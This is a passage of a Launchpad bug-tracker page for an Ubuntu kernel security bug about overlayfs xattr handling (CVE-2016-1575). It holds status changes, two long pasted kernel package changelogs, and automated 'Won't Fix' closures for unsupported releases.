| **summary**: | - insecure overlayfs xattrs handling in copy\_up+ CVE-2016-1575 |
| --- | --- |

[Mathew Hodson (mhodson)](https://launchpad.net/~mhodson)
on 2016-07-23

| Changed in linux (Ubuntu Yakkety): | |
| --- | --- |
| **status**: | Fix Released → Invalid |

[Andy Whitcroft (apw)](https://launchpad.net/~apw)
on 2016-07-27

| Changed in linux (Ubuntu Yakkety): | |
| --- | --- |
| **status**: | Invalid → Fix Committed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-09-21: |  |  | [#13](/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/13) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/13/%2Bdownload) (3.4 KiB)

This bug was fixed in the package linux - 4.8.0-11.12

---------------

linux (4.8.0-11.12) yakkety; urgency=low

\* change\_hat is logging failures during expected hat probing (LP: [#1615893](/bugs/1615893))

    - SAUCE: apparmor: Fix auditing behavior for change\_hat probing

\* deleted files outside of the namespace are not being treated as

    disconnected

    (LP: [#1615892](/bugs/1615892))

    - SAUCE: apparmor: deleted dentries can be disconnected

\* stacking to unconfined in a child namespace confuses mediation

    (LP: [#1615890](/bugs/1615890))

    - SAUCE: apparmor: special case unconfined when determining the mode

\* apparmor module parameters can be changed after the policy is locked

    (LP: [#1615895](/bugs/1615895))

    - SAUCE: apparmor: fix: parameters can be changed after policy is locked

\* AppArmor profile reloading causes an intermittent kernel BUG (LP:

    #1579135)

    - SAUCE: apparmor: fix vec\_unique for vectors larger than 8

\* label vec reductions can result in reference labels instead of direct

    access

    to labels (LP: [#1615889](/bugs/1615889))

    - SAUCE: apparmor: reduction of vec to single entry is just that entry

\* profiles from different namespaces can block other namespaces from being

    able to load a profile (LP: [#1615887](/bugs/1615887))

    - SAUCE: apparmor: profiles in one ns can affect mediation in another ns

\* The label build for onexec when stacking is wrong (LP: [#1615881](/bugs/1615881))

    - SAUCE: apparmor: Fix label build for onexec stacking.

\* The inherit check for new to old label comparison for domain transitions

    is

    wrong (LP: [#1615880](/bugs/1615880))

    - SAUCE: apparmor: Fix new to old label comparison for domain transitions

\* warning stack trace while playing with apparmor namespaces (LP: [#1593874](/bugs/1593874))

    - SAUCE: apparmor: fix stack trace when removing namespace with profiles

\* \_\_label\_update proxy comparison test is wrong (LP: [#1615878](/bugs/1615878))

    - SAUCE: apparmor: Fix \_\_label\_update proxy comparison test

\* reading /sys/kernel/security/apparmor/profiles requires CAP\_MAC\_ADMIN

    (LP: [#1560583](/bugs/1560583))

    - SAUCE: apparmor: Allow ns\_root processes to open profiles file

    - SAUCE: apparmor: Consult sysctl when reading profiles in a user ns

\* policy namespace stacking (LP: [#1379535](/bugs/1379535))

    - SAUCE: (no-up) apparmor: rebase of apparmor3.5-beta1 snapshot for 4.8

    - SAUCE: add a sysctl to enable unprivileged user ns AppArmor policy loading

\* Miscellaneous Ubuntu changes

    - [Debian] Dynamically determine linux udebs package name

    - [Debian] d-i -- fix dtb handling in new kernel-wedge form

    - SAUCE: apparmor: Fix FTBFS due to bad include path

    - SAUCE: apparmor: add data query support

    - [Config] Set CONFIG\_SECURITY\_APPARMOR\_UNCONFINED\_INIT=y

\* Miscellaneous upstream changes

    - fixup backout policy view capable for forward port

    - apparmor: fix: Rework the iter loop for label\_update

    - apparmor: add more assertions for updates/merges to help catch errors

    - apparmor: Make pivot root transitions work with stacking

    - apparmor: convert delegating deleted files to mediate deleted files

    - apparmor: add missing parens. not a bug fix but highly recommended

    - apparmor: add a stack\_version file to allow detection of bug fixes

    - apparmor: push path looku...

[Read more...](/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/13)

This bug was fixed in the package linux - 4.8.0-11.12
---------------
linux (4.8.0-11.12) yakkety; urgency=low
\* change\_hat is logging failures during expected hat probing (LP: #1615893)
- SAUCE: apparmor: Fix auditing behavior for change\_hat probing
\* deleted files outside of the namespace are not being treated as
disconnected
(LP: #1615892)
- SAUCE: apparmor: deleted dentries can be disconnected
\* stacking to unconfined in a child namespace confuses mediation
(LP: #1615890)
- SAUCE: apparmor: special case unconfined when determining the mode
\* apparmor module parameters can be changed after the policy is locked
(LP: #1615895)
- SAUCE: apparmor: fix: parameters can be changed after policy is locked
\* AppArmor profile reloading causes an intermittent kernel BUG (LP:
#1579135)
- SAUCE: apparmor: fix vec\_unique for vectors larger than 8
\* label vec reductions can result in reference labels instead of direct
access
to labels (LP: #1615889)
- SAUCE: apparmor: reduction of vec to single entry is just that entry
\* profiles from different namespaces can block other namespaces from being
able to load a profile (LP: #1615887)
- SAUCE: apparmor: profiles in one ns can affect mediation in another ns
\* The label build for onexec when stacking is wrong (LP: #1615881)
- SAUCE: apparmor: Fix label build for onexec stacking.
\* The inherit check for new to old label comparison for domain transitions
is
wrong (LP: #1615880)
- SAUCE: apparmor: Fix new to old label comparison for domain transitions
\* warning stack trace while playing with apparmor namespaces (LP: #1593874)
- SAUCE: apparmor: fix stack trace when removing namespace with profiles
\* \_\_label\_update proxy comparison test is wrong (LP: #1615878)
- SAUCE: apparmor: Fix \_\_label\_update proxy comparison test
\* reading /sys/kernel/security/apparmor/profiles requires CAP\_MAC\_ADMIN
(LP: #1560583)
- SAUCE: apparmor: Allow ns\_root processes to open profiles file
- SAUCE: apparmor: Consult sysctl when reading profiles in a user ns
\* policy namespace stacking (LP: #1379535)
- SAUCE: (no-up) apparmor: rebase of apparmor3.5-beta1 snapshot for 4.8
- SAUCE: add a sysctl to enable unprivileged user ns AppArmor policy loading
\* Miscellaneous Ubuntu changes
- [Debian] Dynamically determine linux udebs package name
- [Debian] d-i -- fix dtb handling in new kernel-wedge form
- SAUCE: apparmor: Fix FTBFS due to bad include path
- SAUCE: apparmor: add data query support
- [Config] Set CONFIG\_SECURITY\_APPARMOR\_UNCONFINED\_INIT=y
\* Miscellaneous upstream changes
- fixup backout policy view capable for forward port
- apparmor: fix: Rework the iter loop for label\_update
- apparmor: add more assertions for updates/merges to help catch errors
- apparmor: Make pivot root transitions work with stacking
- apparmor: convert delegating deleted files to mediate deleted files
- apparmor: add missing parens. not a bug fix but highly recommended
- apparmor: add a stack\_version file to allow detection of bug fixes
- apparmor: push path lookup into mediation loop
- apparmor: default to allowing unprivileged userns policy
- apparmor: fix: permissions test to view and manage policy
- apparmor: Add Basic ns cross check condition for ipc
-- Leann Ogasawara <leann.ogasawara@canonical.com> Sat, 17 Sep 2016 10:03:16 -0700

| Changed in linux (Ubuntu Yakkety): | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2017-04-05: |  |  | [#14](/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/14) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/14/%2Bdownload) (17.3 KiB)

This bug was fixed in the package linux-raspi2 - 4.10.0-1001.3

---------------

linux-raspi2 (4.10.0-1001.3) zesty; urgency=low

[ Tim Gardner ]

\* Release Tracking Bug

    - LP: [#1673826](/bugs/1673826)

\* Rebased against Ubuntu-4.10.0-14.16

  \* Updated BSP from <https://github.com/raspberrypi/linux.git> rpi-4.10.y

    to commit 8703162f0a3d04c74beb96973bf4180c14a08272

\* msleep() bug causes Nuvoton I2C TPM device driver delays (LP: [#1667567](/bugs/1667567))

    - tpm: msleep() delays - replace with usleep\_range() in i2c nuvoton driver

    - SAUCE: tpm: add sleep only for retry in i2c\_nuvoton\_write\_status()

\* C++ demangling support missing from perf (LP: [#1396654](/bugs/1396654))

    - [Config] added binutils-dev to Build-deps

\* dm-queue-length module is not included in installer/initramfs (LP: [#1673350](/bugs/1673350))

    - [Config] d-i: Also add dm-queue-length to multipath modules

\* move aufs.ko from -extra to linux-image package (LP: [#1673498](/bugs/1673498))

    - [config] aufs.ko moved to linux-image package

\* Using an NVMe drive causes huge power drain (LP: [#1664602](/bugs/1664602))

    - nvme: Add a quirk mechanism that uses identify\_ctrl

    - nvme: Enable autonomous power state transitions

\* Broadcom bluetooth modules sometimes fail to initialize (LP: [#1483101](/bugs/1483101))

    - Bluetooth: btbcm: Add a delay for module reset

\* Need support of Broadcom bluetooth device [413c:8143] (LP: [#1166113](/bugs/1166113))

    - Bluetooth: btusb: Add support for 413c:8143

\* Zesty update to v4.10.3 stable release (LP: [#1673118](/bugs/1673118))

    - serial: 8250\_pci: Add MKS Tenta SCOM-0800 and SCOM-0801 cards

    - KVM: s390: Disable dirty log retrieval for UCONTROL guests

    - KVM: VMX: use correct vmcs\_read/write for guest segment selector/base

    - Bluetooth: Add another AR3012 04ca:3018 device

    - phy: qcom-ufs: Don't kfree devres resource

    - phy: qcom-ufs: Fix misplaced jump label

    - s390/qdio: clear DSCI prior to scanning multiple input queues

    - s390/dcssblk: fix device size calculation in dcssblk\_direct\_access()

    - s390/kdump: Use "LINUX" ELF note name instead of "CORE"

    - s390/chsc: Add exception handler for CHSC instruction

    - s390: TASK\_SIZE for kernel threads

    - s390/topology: correct allocation of topology information

    - s390: make setup\_randomness work

    - s390: use correct input data address for setup\_randomness

    - net: mvpp2: fix DMA address calculation in mvpp2\_txq\_inc\_put()

    - cxl: Prevent read/write to AFU config space while AFU not configured

    - cxl: fix nested locking hang during EEH hotplug

    - brcmfmac: fix incorrect event channel deduction

    - mnt: Tuck mounts under others instead of creating shadow/side mounts.

    - IB/ipoib: Fix deadlock between rmmod and set\_mode

    - IB/IPoIB: Add destination address when re-queue packet

    - IB/mlx5: Fix out-of-bound access

    - IB/SRP: Avoid using IB\_MR\_TYPE\_SG\_GAPS

    - IB/srp: Avoid that duplicate responses trigger a kernel bug

    - IB/srp: Fix race conditions related to task management

    - Btrfs: fix data loss after truncate when using the no-holes feature

    - orangefs: Use RCU for destroy\_inode

    - memory/atmel-ebi: Fix ns <-> cycles conversions

    - tracing: Fix return value check in trace\_benchmark\_reg()

    - ktest: Fix child exi...

This bug was fixed in the package linux-raspi2 - 4.10.0-1001.3
---------------
linux-raspi2 (4.10.0-1001.3) zesty; urgency=low
[ Tim Gardner ]
\* Release Tracking Bug
- LP: #1673826
\* Rebased against Ubuntu-4.10.0-14.16
\* Updated BSP from https://github.com/raspberrypi/linux.git rpi-4.10.y
to commit 8703162f0a3d04c74beb96973bf4180c14a08272
\* msleep() bug causes Nuvoton I2C TPM device driver delays (LP: #1667567)
- tpm: msleep() delays - replace with usleep\_range() in i2c nuvoton driver
- SAUCE: tpm: add sleep only for retry in i2c\_nuvoton\_write\_status()
\* C++ demangling support missing from perf (LP: #1396654)
- [Config] added binutils-dev to Build-deps
\* dm-queue-length module is not included in installer/initramfs (LP: #1673350)
- [Config] d-i: Also add dm-queue-length to multipath modules
\* move aufs.ko from -extra to linux-image package (LP: #1673498)
- [config] aufs.ko moved to linux-image package
\* Using an NVMe drive causes huge power drain (LP: #1664602)
- nvme: Add a quirk mechanism that uses identify\_ctrl
- nvme: Enable autonomous power state transitions
\* Broadcom bluetooth modules sometimes fail to initialize (LP: #1483101)
- Bluetooth: btbcm: Add a delay for module reset
\* Need support of Broadcom bluetooth device [413c:8143] (LP: #1166113)
- Bluetooth: btusb: Add support for 413c:8143
\* Zesty update to v4.10.3 stable release (LP: #1673118)
- serial: 8250\_pci: Add MKS Tenta SCOM-0800 and SCOM-0801 cards
- KVM: s390: Disable dirty log retrieval for UCONTROL guests
- KVM: VMX: use correct vmcs\_read/write for guest segment selector/base
- Bluetooth: Add another AR3012 04ca:3018 device
- phy: qcom-ufs: Don't kfree devres resource
- phy: qcom-ufs: Fix misplaced jump label
- s390/qdio: clear DSCI prior to scanning multiple input queues
- s390/dcssblk: fix device size calculation in dcssblk\_direct\_access()
- s390/kdump: Use "LINUX" ELF note name instead of "CORE"
- s390/chsc: Add exception handler for CHSC instruction
- s390: TASK\_SIZE for kernel threads
- s390/topology: correct allocation of topology information
- s390: make setup\_randomness work
- s390: use correct input data address for setup\_randomness
- net: mvpp2: fix DMA address calculation in mvpp2\_txq\_inc\_put()
- cxl: Prevent read/write to AFU config space while AFU not configured
- cxl: fix nested locking hang during EEH hotplug
- brcmfmac: fix incorrect event channel deduction
- mnt: Tuck mounts under others instead of creating shadow/side mounts.
- IB/ipoib: Fix deadlock between rmmod and set\_mode
- IB/IPoIB: Add destination address when re-queue packet
- IB/mlx5: Fix out-of-bound access
- IB/SRP: Avoid using IB\_MR\_TYPE\_SG\_GAPS
- IB/srp: Avoid that duplicate responses trigger a kernel bug
- IB/srp: Fix race conditions related to task management
- Btrfs: fix data loss after truncate when using the no-holes feature
- orangefs: Use RCU for destroy\_inode
- memory/atmel-ebi: Fix ns <-> cycles conversions
- tracing: Fix return value check in trace\_benchmark\_reg()
- ktest: Fix child exit code processing
- ceph: remove req from unsafe list when unregistering it
- target: Fix NULL dereference during LUN lookup + active I/O shutdown
- drivers/pci/hotplug: Handle presence detection change properly
- drivers/pci/hotplug: Fix initial state for empty slot
- nlm: Ensure callback code also checks that the files match
- pwm: pca9685: Fix period change with same duty cycle
- xtensa: move parse\_tag\_fdt out of #ifdef CONFIG\_BLK\_DEV\_INITRD
- nfit, libnvdimm: fix interleave set cookie calculation
- mac80211: flush delayed work when entering suspend
- mac80211: don't reorder frames with SN smaller than SSN
- mac80211: don't handle filtered frames within a BA session
- mac80211: use driver-indicated transmitter STA only for data frames
- drm/amdgpu: add more cases to DCE11 possible crtc mask setup
- drm/amdgpu/pm: check for headless before calling compute\_clocks
- Revert "drm/amdgpu: update tile table for oland/hainan"
- drm/ast: Fix AST2400 POST failure without BMC FW or VBIOS
- drm/radeon: handle vfct with multiple vbios images
- drm/edid: Add EDID\_QUIRK\_FORCE\_8BPC quirk for Rotel RSX-1058
- drm/ttm: Make sure BOs being swapped out are cacheable
- drm/vmwgfx: Work around drm removal of control nodes
- drm/imx: imx-tve: Do not set the regulator voltage
- drm/atomic: fix an error code in mode\_fixup()
- drm/i915/gvt: Disable access to stolen memory as a guest
- drm: Cancel drm\_fb\_helper\_dirty\_work on unload
- drm: Cancel drm\_fb\_helper\_resume\_work on unload
- drm/i915: Recreate internal objects with single page segments if dmar fails
- drm/i915: Avoid spurious WARNs about the wrong pipe in the PPS code
- drm/i915: Check for timeout completion when waiting for the rq to submitted
- drm/i915: Pass timeout==0 on to i915\_gem\_object\_wait\_fence()
- drm/i915: Fix not finding the VBT when it overlaps with OPREGION\_ASLE\_EXT
- libceph: use BUG() instead of BUG\_ON(1)
- x86, mm: fix gup\_pte\_range() vs DAX mappings
- x86/tlb: Fix tlb flushing when lguest clears PGE
- thp: fix another corner case of munlock() vs. THPs
- mm: do not call mem\_cgroup\_free() from within mem\_cgroup\_alloc()
- kasan: resched in quarantine\_remove\_cache()
- fat: fix using uninitialized fields of fat\_inode/fsinfo\_inode
- drivers: hv: Turn off write permission on the hypercall page
- Linux 4.10.3
\* Zesty update to v4.10.2 stable release (LP: #1672544)
- MIPS: pic32mzda: Fix linker error for pic32\_get\_pbclk()
- MIPS: Fix special case in 64 bit IP checksumming.
- MIPS: BCM47XX: Fix button inversion for Asus WL-500W
- MIPS: OCTEON: Fix copy\_from\_user fault handling for large buffers
- MIPS: Lantiq: Keep ethernet enabled during boot
- MIPS: Clear ISA bit correctly in get\_frame\_info()
- MIPS: Prevent unaligned accesses during stack unwinding
- MIPS: Fix get\_frame\_info() handling of microMIPS function size
- MIPS: Fix is\_jump\_ins() handling of 16b microMIPS instructions
- MIPS: Calculate microMIPS ra properly when unwinding the stack
- MIPS: Handle microMIPS jumps in the same way as MIPS32/MIPS64 jumps
- mmc: sdhci-acpi: support deferred probe
- am437x-vpfe: always assign bpp variable
- uvcvideo: Fix a wrong macro
- media: fix dm1105.c build error
- cxd2820r: fix gpio null pointer dereference
- dvb-usb: don't use stack for firmware load
- lirc\_dev: LIRC\_{G,S}ET\_REC\_MODE do not work
- media: Properly pass through media entity types in entity enumeration
- ext4: fix deadlock between inline\_data and ext4\_expand\_extra\_isize\_ea()
- spi: s3c64xx: fix inconsistency between binding and driver
- ARM: at91: define LPDDR types
- ARM: dts: at91: Enable DMA on sama5d4\_xplained console
- ARM: dts: at91: Enable DMA on sama5d2\_xplained console
- ALSA: hda/realtek - Cannot adjust speaker's volume on a Dell AIO
- ALSA: hda - fix Lewisburg audio issue
- ALSA: timer: Reject user params with too small ticks
- ALSA: ctxfi: Fallback DMA mask to 32bit
- ALSA: seq: Fix link corruption by event error handling
- ALSA: hda - Add subwoofer support for Dell Inspiron 17 7000 Gaming
- ALSA: hda - Fix micmute hotkey problem for a lenovo AIO machine
- hwmon: (it87) Do not overwrite bit 2..6 of pwm control registers
- hwmon: (it87) Ensure that pwm control cache is current before updating values
- staging: greybus: loopback: fix broken udelay
- staging/lustre/lnet: Fix allocation size for sv\_cpt\_data
- staging: rtl: fix possible NULL pointer dereference
- coresight: STM: Balance enable/disable
- coresight: fix kernel panic caused by invalid CPU
- regulator: Fix regulator\_summary for deviceless consumers
- tpm\_tis: use default timeout value if chip reports it as zero
- tpm\_tis: fix the error handling of init\_tis()
- iommu/vt-d: Fix some macros that are incorrectly specified in intel-iommu
- iommu/vt-d: Tylersburg isoch identity map check is done too late.
- CIFS: Fix splice read for non-cached files
- mm, devm\_memremap\_pages: hold device\_hotplug lock over mem\_hotplug\_{begin, done}
- mm/page\_alloc: fix nodes for reclaim in fast path
- mm: vmpressure: fix sending wrong events on underflow
- mm: do not access page->mapping directly on page\_endio
- mm balloon: umount balloon\_mnt when removing vb device
- mm, vmscan: cleanup lru size claculations
- mm, vmscan: consider eligible zones in get\_scan\_count
- sigaltstack: support SS\_AUTODISARM for CONFIG\_COMPAT
- ipc/shm: Fix shmat mmap nil-page protection
- ima: fix ima\_d\_path() possible race with rename
- PM / devfreq: Fix available\_governor sysfs
- PM / devfreq: Fix wrong trans\_stat of passive devfreq device
- dm cache: fix corruption seen when using cache > 2TB
- dm stats: fix a leaked s->histogram\_boundaries array
- dm round robin: revert "use percpu 'repeat\_count' and 'current\_path'"
- dm raid: fix data corruption on reshape request
- scsi: qla2xxx: Cleaned up queue configuration code.
- scsi: qla2xxx: Fix response queue count for Target mode.
- scsi: qla2xxx: Fix Regression introduced by pci\_alloc\_irq\_vectors\_affinity call.
- Revert "scsi: aacraid: Reorder Adapter status check"
- scsi: aacraid: Reorder Adapter status check
- scsi: use 'scsi\_device\_from\_queue()' for scsi\_dh
- power: reset: at91-poweroff: timely shutdown LPDDR memories
- Fix: Disable sys\_membarrier when nohz\_full is enabled
- jbd2: don't leak modified metadata buffers on an aborted journal
- block/loop: fix race between I/O and set\_status
- loop: fix LO\_FLAGS\_PARTSCAN hang
- ext4: Include forgotten start block on fallocate insert range
- ext4: do not polute the extents cache while shifting extents
- ext4: trim allocation requests to group size
- ext4: fix data corruption in data=journal mode
- ext4: fix use-after-iput when fscrypt contexts are inconsistent
- ext4: fix inline data error paths
- ext4: preserve the needs\_recovery flag when the journal is aborted
- ext4: return EROFS if device is r/o and journal replay is needed
- ext4: fix fencepost in s\_first\_meta\_bg validation
- samples/seccomp: fix 64-bit comparison macros
- mei: remove support for broken parallel read
- ath10k: fix boot failure in UTF mode/testmode
- ath5k: drop bogus warning on drv\_set\_key with unsupported cipher
- ath9k: fix race condition in enabling/disabling IRQs
- ath9k: use correct OTP register offsets for the AR9340 and AR9550
- PCI: hv: Fix wslot\_to\_devfn() to fix warnings on device removal
- PCI: altera: Fix TLP\_CFG\_DW0 for TLP write
- Drivers: hv: vmbus: Raise retry/wait limits in vmbus\_post\_msg()
- crypto: xts - Add ECB dependency
- crypto: testmgr - Pad aes\_ccm\_enc\_tv\_template vector
- crypto: xts - Propagate NEED\_FALLBACK bit
- crypto: api - Add crypto\_requires\_off helper
- fuse: add missing FR\_FORCE
- x86/pkeys: Check against max pkey to avoid overflows
- arm/arm64: KVM: Enforce unconditional flush to PoC when mapping to stage-2
- arm64: dma-mapping: Fix dma\_mapping\_error() when bypassing SWIOTLB
- arm64: fix erroneous \_\_raw\_read\_system\_reg() cases
- KVM: arm/arm64: vgic: Stop injecting the MSI occurrence twice
- Revert "arm64: mm: set the contiguous bit for kernel mappings where appropriate"
- iio: pressure: mpl115: do not rely on structure field ordering
- iio: pressure: mpl3115: do not rely on structure field ordering
- can: gs\_usb: Don't use stack memory for USB transfers
- can: usb\_8dev: Fix memory leak of priv->cmd\_msg\_buffer
- w1: don't leak refcount on slave attach failure in w1\_attach\_slave\_device()
- w1: ds2490: USB transfer buffers need to be DMAable
- usb: musb: da8xx: Remove CPPI 3.0 quirk and methods
- usb: dwc3: gadget: skip Set/Clear Halt when invalid
- usb: host: xhci: plat: check hcc\_params after add hcd
- usb: gadget: udc-core: Rescan pending list on driver unbind
- usb: gadget: udc: fsl: Add missing complete function.
- usb: gadget: f\_hid: fix: Free out requests
- usb: gadget: f\_hid: fix: Prevent accessing released memory
- usb: gadget: f\_hid: Use spinlock instead of mutex
- usb: gadget: f\_hid: fix: Move IN request allocation to set\_alt()
- hv: allocate synic pages for all present CPUs
- hv: init percpu\_list in hv\_synic\_alloc()
- Drivers: hv: vmbus: Prevent sending data on a rescinded channel
- Drivers: hv: vmbus: Fix a rescind handling bug
- Drivers: hv: util: kvp: Fix a rescind processing issue
- Drivers: hv: util: Fcopy: Fix a rescind processing issue
- Drivers: hv: util: Backup: Fix a rescind processing issue
- RDMA/core: Fix incorrect structure packing for booleans
- rdma\_cm: fail iwarp accepts w/o connection params
- gfs2: Add missing rcu locking for glock lookup
- remoteproc: qcom: mdt\_loader: Don't overwrite firmware object
- rtlwifi: Fix alignment issues
- rtlwifi: rtl8192c-common: Fix "BUG: KASAN:
- VME: restore bus\_remove function causing incomplete module unload
- nfsd: minor nfsd\_setattr cleanup
- nfsd: special case truncates some more
- NFSv4: Fix memory and state leak in \_nfs4\_open\_and\_get\_state
- NFSv4: Fix reboot recovery in copy offload
- pNFS/flexfiles: If the layout is invalid, it must be updated before retrying
- Revert "NFSv4.1: Handle NFS4ERR\_BADSESSION/NFS4ERR\_DEADSESSION replies to OP\_SEQUENCE"
- NFSv4: fix getacl head length estimation
- NFSv4: fix getacl ERANGE for some ACL buffer sizes
- f2fs: fix a problem of using memory after free
- f2fs: fix multiple f2fs\_add\_link() calls having same name
- f2fs: add ovp valid\_blocks check for bg gc victim to fg\_gc
- f2fs: avoid to issue redundant discard commands
- f2fs: Fix zoned block device support
- rtc: sun6i: Disable the build as a module
- rtc: sun6i: Add some locking
- rtc: sun6i: Switch to the external oscillator
- md linear: fix a race between linear\_add() and linear\_congested()
- bcma: use (get|put)\_device when probing/removing device driver
- mtd: nand: ifc: Fix location of eccstat registers for IFC V1.0
- dmaengine: ipu: Make sure the interrupt routine checks all interrupts.
- xprtrdma: Fix Read chunk padding
- xprtrdma: Per-connection pad optimization
- xprtrdma: Disable pad optimization by default
- xprtrdma: Reduce required number of send SGEs
- powerpc/xmon: Fix data-breakpoint
- powerpc/mm: Add MMU\_FTR\_KERNEL\_RO to possible feature mask
- module: fix memory leak on early load\_module() failures
- MIPS: IP22: Reformat inline assembler code to modern standards.
- MIPS: IP22: Fix build error due to binutils 2.25 uselessnes.
- ceph: update readpages osd request according to size of pages
- Linux 4.10.2
\* kernel selftests ADT failure with linux 4.10.0-13.15 on ppc64el (LP: #1672510)
- SAUCE: Add '-fno-ie -no-pie' to cflags for powerpc ptrace tests
\* arm64: Workaround QDF2400 erratum 0065 (LP: #1672486)
- [Config] CONFIG\_QCOM\_QDF2400\_ERRATUM\_0065=y
- irqchip/gicv3-its: Add workaround for QDF2400 ITS erratum 0065
\* arm64 MSI/PCIe passthrough patches break build of certain configs (LP: #1672502)
- irqdomain: Add empty irq\_domain\_check\_msi\_remap
\* pinctrl: qcom: add get\_direction function (LP: #1672504)
- pinctrl: qcom: add get\_direction function
\* perf probes on arm64 don't work with 4.10 kernel b/c of register name issue (LP: #1671917)
- perf probe: Fix wrong register name for arm64
\* cleanup primary tree for linux-hwe layering issues (LP: #1637473)
- [Config] linux-source-\* is in the primary linux namespace
\* hv\_set\_ifconfig script parsing fails for certain configuration (LP: #1640109)
- hv\_set\_ifconfig -- handle DHCP interfaces correctly
- hv\_set\_ifconfig -- ensure we include the last stanza
\* Revert "UBUNTU: SAUCE: Disable timers selftest for now" (LP: #1672372)
- Revert "UBUNTU: SAUCE: Disable timers selftest for now"
\* Ubuntu 16.10: Network checksum fixes needed for IPoIB for Mellanox CX4/CX5 card (LP: #1670247)
- powerpc/64: Fix checksum folding in csum\_add()
\* POWER9: Additional power9 patches (LP: #1671613)
- mm/autonuma: don't use set\_pte\_at when updating protnone ptes
- mm/autonuma: let architecture override how the write bit should be stashed in a protnone pte.
- powerpc/mm/autonuma: switch ppc64 to its own implementation of saved write
- mm/gup: check for protnone only if it is a PTE entry
- mm/thp/autonuma: use TNF flag instead of vm fault
- SAUCE: powerpc/mm: handle protnone ptes on fork
- SAUCE: power/mm: update pte\_write and pte\_wrprotect to handle savedwrite
- mm/ksm: improve deduplication of zero pages with colouring
- mm: introduce page\_vma\_mapped\_walk()
- mm, ksm: convert write\_protect\_page() to use page\_vma\_mapped\_walk()
- mm/ksm: handle protnone saved writes when making page write protect
\* POWER9 : Enable Stop 0-2 with ESL=EC=0 (LP: #1666197)
- powerpc/powernv: Fix bug due to labeling ambiguity in power\_enter\_stop
\* Miscellaneous Ubuntu changes
- [Debian] consider renames in gen-auto-reconstruct
-- Tim Gardner <tim.gardner@canonical.com> Fri, 17 Mar 2017 09:24:21 -0600

| Changed in linux-raspi2 (Ubuntu): | |
| --- | --- |
| **status**: | Invalid → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Andy Whitcroft (apw)](https://launchpad.net/~apw) wrote on 2017-10-17:  [**Closing unsupported series nomination.**](/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/15) |  |  | [#15](/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/15) |
| --- | --- | --- | --- |

This bug was nominated against a series that is no longer supported, ie vivid. The bug task representing the vivid nomination is being closed as Won't Fix.

This change has been made by an automated script, maintained by the Ubuntu Kernel Team.

This bug was nominated against a series that is no longer supported, ie vivid. The bug task representing the vivid nomination is being closed as Won't Fix.
This change has been made by an automated script, maintained by the Ubuntu Kernel Team.

| Changed in linux-armadaxp (Ubuntu Vivid): | |
| --- | --- |
| **status**: | New → Won't Fix |

[Andy Whitcroft (apw)](https://launchpad.net/~apw)
on 2017-10-17

| Changed in linux-flo (Ubuntu Vivid): | |
| --- | --- |
| **status**: | New → Won't Fix |

[Andy Whitcroft (apw)](https://launchpad.net/~apw)
on 2017-10-17

| Changed in linux-goldfish (Ubuntu Vivid): | |
| --- | --- |
| **status**: | New → Won't Fix |

[Andy Whitcroft (apw)](https://launchpad.net/~apw)
on 2017-10-17

| Changed in linux-lts-quantal (Ubuntu Vivid): | |
| --- | --- |
| **status**: | New → Won't Fix |

[Andy Whitcroft (apw)](https://launchpad.net/~apw)
on 2017-10-17

| Changed in linux-lts-trusty (Ubuntu Vivid): | |
| --- | --- |
| **status**: | New → Won't Fix |

[Andy Whitcroft (apw)](https://launchpad.net/~apw)
on 2017-10-17

| Changed in linux-lts-utopic (Ubuntu Vivid): | |
| --- | --- |
| **status**: | New → Won't Fix |

[Andy Whitcroft (apw)](https://launchpad.net/~apw)
on 2017-10-17

| Changed in linux-lts-vivid (Ubuntu Vivid): | |
| --- | --- |
| **status**: | New → Won't Fix |

[Andy Whitcroft (apw)](https://launchpad.net/~apw)
on 2017-10-17

| Changed in linux-lts-wily (Ubuntu Vivid): | |
| --- | --- |
| **status**: | New → Won't Fix |

[Andy Whitcroft (apw)](https://launchpad.net/~apw)
on 2017-10-17

| Changed in linux-raspi2 (Ubuntu Vivid): | |
| --- | --- |
| **status**: | New → Won't Fix |

[Andy Whitcroft (apw)](https://launchpad.net/~apw)
on 2017-10-17

| Changed in linux-ti-omap4 (Ubuntu Vivid): | |
| --- | --- |
| **status**: | New → Won't Fix |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Steve Langasek (vorlon)](https://launchpad.net/~vorlon) wrote on 2021-10-14: |  |  | [#25](/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/25) |
| --- | --- | --- | --- |

The Precise Pangolin has reached end of life, so this bug will not be fixed for that release

The Precise Pangolin has reached end of life, so this bug will not be fixed for that release

| Changed in linux (Ubuntu Precise): | |
| --- | --- |
| **status**: | New → Won't Fix |
| Changed in linux-armadaxp (Ubuntu Precise): | |
| **status**: | New → Won't Fix |
| Changed in linux-ti-omap4 (Ubuntu Precise): | |
| **status**: | New → Won't Fix |

[See full activity log](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1534961/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/ubuntu/%2Bsource/linux/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/ubuntu/%2Bsource/linux/%2Bbug/1534961/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1534961/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1534961/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Bug attachments

